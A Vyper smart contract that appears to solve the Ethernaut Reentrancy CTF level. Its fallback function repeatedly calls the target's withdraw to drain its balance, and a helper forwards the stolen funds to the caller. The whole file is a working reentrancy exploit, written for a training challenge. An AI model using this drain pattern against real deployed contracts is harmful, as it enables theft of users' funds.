# pragma version 0.4.0
"""
@license MIT
@title Attack reentrancy
@author s3bc40
@dev
    Vyper challenge solver for the Reentrancy Ethermaut CTF
"""

# ##### Interfaces #####
interface ReentranceInterface:
    def balances(addr: address) -> uint256: view
    def donate(_to: address): payable
    def balanceOf(_who: address) -> uint256: view
    def withdraw(_amount: uint256): nonpayable

# ##### Const & Immut #####
REENTRANCE: immutable(ReentranceInterface)
REENTRANCE_ADDRESS: immutable(address)  # Store the address separately

# Constructor
@deploy
def __init__(contract: address):
    REENTRANCE = ReentranceInterface(contract)
    REENTRANCE_ADDRESS = contract  # Store the address


# Fallback/receive
@external
@payable
def __default__():
    """
    @dev
        This where this attack will take place.
        By receiving ETH from the contract, this contract will call withdraw
        again and take all the balance of the contract
    """
    if REENTRANCE_ADDRESS.balance > 0:
        self._withdraw(msg.value)

# ##### External #####
@external
@payable
def donate_to_reentrance():
    """
        @dev 
            Struggled to set raw_call but doc helped a lot.
            Carefull about the params inside abi_encode and also raw_call
    """
    print("In donate")
    raw_call(REENTRANCE_ADDRESS, abi_encode(self, method_id=method_id("donate(address)")), value=msg.value)

@external
def withdraw_attack_reentrance(amount: uint256):
    self._withdraw(amount)

@external
@payable
def transact_contract_balance():
    """
    @dev Send back the funds to the stealer
    """
    raw_call(msg.sender, b"", value=self.balance)

# ##### Internal #####
def _withdraw(amount: uint256):
    extcall REENTRANCE.withdraw(amount)
    print("Passed in internal withdraw")

